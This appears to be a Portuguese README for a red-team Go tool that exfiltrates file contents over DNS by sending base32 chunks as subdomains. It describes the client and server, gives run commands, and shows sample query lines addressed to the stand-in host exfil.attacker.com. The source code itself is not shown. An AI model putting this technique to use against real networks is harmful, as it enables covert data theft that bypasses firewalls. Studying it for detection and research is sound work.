<img src="https://capsule-render.vercel.app/api?type=rounded&height=300&color=gradient&text=dns-exfil-go" img/>

----
Ferramenta escrita em Go para **exfiltração de dados via requisições DNS**, utilizando codificação base32 e fragmentação em subdomínios.


## 📌 Visão Geral

Este projeto simula uma técnica avançada usada por agentes maliciosos para **vazar dados através de requisições DNS**, contornando firewalls e bloqueios de HTTP/HTTPS. O cliente lê um arquivo, fragmenta, codifica e envia cada pedaço como subdomínio. O servidor intercepta as queries DNS, reagrupa os pedaços e reconstrói o conteúdo original.

---

## ⚙️ Estrutura do Projeto

```

dns-exfil-go/
├── client.go           # Cliente que exfiltra um arquivo via DNS
├── server.go           # Servidor DNS que intercepta e reconstrói os dados
├── utils.go            # Funções auxiliares (base32 e chunking)
├── LICENSE             # Licença MIT
└── README.md           # Este arquivo

```

---

## 🔁 Como Funciona

1. O cliente lê um arquivo local (`data.txt`) e divide o conteúdo em pedaços.
2. Cada pedaço é codificado em Base32.
3. É criada uma query DNS do tipo A com o formato:  
```

\<chunk\_base32>.\<session\_id>.<ordem>.exfil.attacker.com

````
4. O servidor DNS escuta as requisições na porta 5353 (UDP), agrupa os chunks por sessão e reconstrói os dados ao detectar o chunk finalizador (`END_OF_SESSION`).

---

## 🚀 Como Usar

### ⚙️ Requisitos

- Go 1.16 ou superior
- Biblioteca: `github.com/miekg/dns` (instalada com `go mod tidy`)

---

### 🛰️ Rodar o Servidor

```bash
cd dns-exfil-go
go run server.go
````

* O servidor escuta por requisições na porta `5353/udp`.
* O arquivo reconstruído será salvo como: `exfiltrated_data_<session>.bin`

---

### 🧪 Rodar o Cliente

```bash
go run client.go
```

* O cliente cria um arquivo de teste (`data.txt`), lê, fragmenta e envia via DNS.
* Os dados são enviados para `127.0.0.1:5353` com domínio base `exfil.attacker.com` (configure conforme seu setup).

---

## 🔐 Exemplo de Requisição DNS Enviada

```
U3RyaW5nMQ.session42.0.exfil.attacker.com
U3RyaW5nMg.session42.1.exfil.attacker.com
RU5EX09GX1NFU1NJT04.session42.2.exfil.attacker.com
```

---

## 🧯 Aviso Ético

> Esta ferramenta foi criada **exclusivamente para fins educacionais e de pesquisa em segurança**.
> Qualquer uso não autorizado, especialmente em sistemas que você não possui ou não tem permissão explícita para testar, é ilegal.
> Os autores não se responsabilizam por qualquer uso indevido deste código.

---

## 🧠 Referências Técnicas

* [Red Teaming with DNS Exfiltration](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/data-exfiltration-over-dns)
* [miekg/dns - Go DNS lib](https://github.com/miekg/dns)
* [Base32 Encoding RFC 4648](https://datatracker.ietf.org/doc/html/rfc4648)

---

## 🧑‍💻 Autor

**Felipe Gonçalves Costa**
Especialista em Segurança Ofensiva · Bug Hunter · Exploit Developer
[GitHub](https://github.com/SEU_USUARIO_AQUI) • [LinkedIn](https://linkedin.com/in/felipe-gonçalves-costa-b26b72346)

---

## 📄 Licença

Distribuído sob licença [MIT](LICENSE).

